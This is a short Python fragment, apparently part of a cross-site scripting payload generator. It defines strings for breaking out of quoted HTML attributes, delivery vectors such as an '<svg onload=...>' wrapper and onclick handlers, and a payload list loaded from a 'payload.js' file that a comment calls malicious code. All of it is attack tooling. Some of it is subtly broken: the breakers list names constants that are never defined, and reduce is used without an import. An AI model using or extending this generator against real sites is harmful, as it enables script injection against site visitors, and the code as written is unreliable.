# Constants
# TODO: Check out this script to scrape infomration on event handlers
events = ["onclick", "onmouseover"]

# Breakers - used to break out of current context
BREAK_DOUBLE_QUOTES = "\">"
BREAK_SINGLE_QUOTES = "\'>"
breakers = [DOUBLE_QUOTE_ATTR, SINGLE_QUOTE_ATTR]

# Delivery vectors - used invoke a JS context
SVG_VECTOR = lambda x : "<svg onload=\"{}\">".format(x)
EVENT_HANDLER = lambda x: gen_event() + "=\"{}\"".format(x) 
delivery = [SVG_VECTOR, EVENT_HANDLER]

#TODO
def gen_event():
    return events[0]


# Payloads - malicious code to be executed
WSpayload = reduce(lambda x, y : x + y, map(lambda x : x.strip(), open("payload.js").read().split('\n')))
payloads =[WSpayload]